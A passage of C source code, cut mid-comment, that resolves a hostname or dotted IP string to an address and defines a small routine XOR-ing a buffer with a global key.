Host may be an IP (1.2.3.4) *or* a host (eg: something.com)
So heres some code for handling it nicely :)
*/
	unsigned long ip;
	hostent *boo;

	ip=inet_addr(Host);
	if (ip==INADDR_NONE) {
		// Well, not a valid IP...
		boo=gethostbyname(Host);
		if (boo==NULL) return 0;
		memcpy(&ip,*boo->h_addr_list,4);	
	}


	return ip;
}


char *Xorbuff(char *buff,int buffLen)
{
	int i;
	for (i=0;i<buffLen;i++)
	{
		buff[i]^=prefix;
	}
	return buff;
}